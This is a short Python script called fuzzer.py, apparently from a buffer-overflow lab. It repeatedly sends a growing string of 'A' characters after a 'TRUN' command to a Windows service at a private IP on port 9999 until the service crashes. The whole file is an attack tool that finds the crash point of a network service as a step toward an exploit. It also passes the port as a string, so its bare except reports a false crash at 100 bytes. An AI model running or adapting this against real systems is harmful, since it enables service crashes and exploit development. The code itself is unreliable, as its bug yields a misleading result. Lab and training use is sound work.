#! /usr/bin/python

#fuzzer.py 

import sys, socket 

from time import sleep 

buffer = "A" * 100 

while True : 

	try:

		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.29.31' , '9999')) # windows ip and port to be given in 
		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100

	except:

		print "Fuzzing crashed at %s bytes" % str(len(buffer))	
		sys.exit()

		

# change mode to executable , 
# chmod +x fuzzer.py
